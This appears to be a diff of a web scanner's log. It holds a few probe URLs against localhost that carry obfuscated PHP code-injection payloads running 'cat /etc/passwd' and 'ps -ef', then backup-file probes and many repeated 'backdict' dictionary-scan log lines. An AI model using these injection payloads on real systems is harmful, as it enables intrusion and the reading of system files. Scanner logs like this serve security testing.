+http://localhost/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}~
+http://localhost/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}
+http://localhost/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}s
+http://localhost/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}~
+http://localhost/index.php/product
+http://localhost/index.php/product/list
+http://localhost/index.php/product/lists
+http://localhost/index.php/product/list~
+http://localhost/index.php/tools-staticPage.html
+http://localhost/index.php/tools-staticPage.htmls
+http://localhost/index.php/tools-staticPage.html~
+http://localhost/index.php/weblinks-categories
+http://localhost/index.php/weblinks-categoriess
+http://localhost/index.php/weblinks-categories~
+  
+2015-12-07 11:44:09    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:46:20    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:46:41    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:48:07    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:48:09    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:48:09    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:48:10    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:48:38    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:48:39    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:48:39    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:50:09    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:51:56    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:51:56    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:51:56    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:51:56    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:51:57    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:51:57    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:51:57    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:51:57    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:51:58    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:52:47    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:53:08    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:53:52    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:53:53    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:53:53    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:53:53    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:53:53    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:53:53    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:53:53    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:53:54    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:53:54    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:53:54    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:54:22    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:54:24    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:54:25    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:54:25    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:54:25    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:54:28    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:54:28    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:54:43    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:54:43    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:54:43    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:54:43    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:54:43    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:56:38    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:02    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:02    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:02    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:02    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:05    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:05    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:05    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:20    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:21    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:22    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:22    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:33    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:43    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:43    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:44    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 11:58:44    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:04    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:07    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:07    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:07    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:07    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:08    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:08    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:08    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:08    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:08    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:08    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:09    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:09    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:21    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:37:36    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:43:27    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:43:28    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:43:29    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:43:29    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:43:47    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:48:47    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:48:47    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:49:51    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:50:41    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:51:20    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:52:15    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:52:47    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 13:56:44    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:01:15    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:04:35    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:04:36    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:09:55    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:10:27    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:10:50    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:11:12    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:11:18    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:14:33    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:14:42    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:14:47    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:15:58    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:16:47    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:17:23    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:17:27    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:18:12    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:19:24    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:20:12    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:20:26    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:22:00    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:22:22    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:22:50    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:22:54    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:24:07    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:24:10    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:24:17    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:24:22    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:28:25    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:28:28    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:28:50    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:29:18    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:29:22    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:30:39    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:31:45    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:32:10    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:32:23    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:34:00    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:35:34    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:35:39    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:35:50    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 14:37:41    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 16:19:18    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 16:21:09    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 16:21:11    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 16:21:13    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 16:21:16    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 16:25:33    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
